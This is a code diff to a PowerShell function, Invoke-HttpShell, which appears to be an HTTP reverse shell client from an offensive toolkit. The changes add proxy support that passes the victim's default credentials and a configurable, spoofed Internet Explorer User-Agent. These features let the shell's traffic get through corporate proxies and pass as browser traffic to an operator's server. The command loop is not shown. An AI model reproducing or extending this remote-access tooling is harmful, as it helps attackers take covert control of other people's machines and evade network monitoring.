@@ -21,6 +21,7 @@ function Invoke-HttpShell
 .Example
     Import-Module HTTP-Shell.ps1
     Invoke-HttpShell -SERVER 127.0.0.1 -PORT 80
+    Invoke-HttpShell -SERVER 127.0.0.1 -PORT 80 -UseProxy 'http://testproxy.com:80' -UA 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)'
 
 #>
     [CmdletBinding()]
@@ -28,7 +29,11 @@ function Invoke-HttpShell
         [Parameter(Mandatory = $True)]
         [string]$Server,
         [Parameter(Mandatory = $True)]
-        [string]$Port
+        [string]$Port,
+        [Parameter(Mandatory = $False)]
+        [string]$UseProxy = $Null,
+        [Parameter(Mandatory = $False)]
+        [string]$UserAgent = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
     )
     process
     {
@@ -53,9 +58,17 @@ function Invoke-HttpShell
         $uri = "http://" + $Server + ":" + $Port + "/"
         $wc = New-Object -TypeName System.Net.WebClient
 
-        $wc.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)")
+        $wc.Headers.Add("User-Agent", $UserAgent)
         $wc.Headers.Add("Content-type", "application/x-www-form-urlencoded")
         $wc.Headers.Add("Accept", "text/plain")
+
+        if ($UseProxy) {
+            $proxy = New-Object -TypeName System.Net.WebProxy
+            $proxy.Address = $UseProxy
+            $proxy.UseDefaultCredentials = $True
+            $proxy.BypassProxyOnLocal = $False
+            $wc.proxy = $proxy
+        }
 
         $sleep = 2
 
